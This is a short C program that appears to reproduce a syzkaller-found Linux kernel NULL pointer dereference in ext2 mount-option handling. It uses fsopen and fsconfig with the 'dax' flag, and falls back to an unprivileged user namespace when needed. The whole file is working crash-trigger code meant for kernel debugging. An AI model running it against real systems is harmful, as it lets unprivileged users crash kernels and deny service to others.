// https://syzkaller.appspot.com/bug?id=9faaf591347205c2e1d9abcc6ad8f7b8175bd221
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sched.h>
#include <sys/syscall.h>
#include <linux/mount.h>

#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif

#ifndef FSCONFIG_SET_FLAG
#define FSCONFIG_SET_FLAG 0
#endif

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Starting reproducer for ext2_msg_fc NULL pointer dereference in strrchr...\n");

    int fd = syscall(__NR_fsopen, "ext2", 0);
    if (fd < 0 && errno == EPERM) {
        printf("[*] fsopen returned EPERM, attempting unshare(CLONE_NEWUSER | CLONE_NEWNS)...\n");
        int res = unshare(CLONE_NEWUSER | CLONE_NEWNS);
        if (res < 0) {
            printf("[-] Failed to unshare: %s\n", strerror(errno));
            exit(1);
        }
        printf("[+] unshare successful.\n");
        fd = syscall(__NR_fsopen, "ext2", 0);
    }

    if (fd < 0) {
        printf("[-] Failed to fsopen ext2: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] fsopen ext2 successful (fd=%d).\n", fd);

    printf("[*] Invoking fsconfig with 'dax' flag without specifying source...\n");
    int res = syscall(__NR_fsconfig, fd, FSCONFIG_SET_FLAG, "dax", NULL, 0);
    if (res < 0) {
        printf("[-] fsconfig failed: %s\n", strerror(errno));
        close(fd);
        exit(1);
    }
    printf("[+] fsconfig succeeded.\n");

    res = close(fd);
    if (res < 0) {
        printf("[-] Failed to close fd: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] close successful.\n");

    printf("[+] Reproducer finished.\n");
    return 0;
}
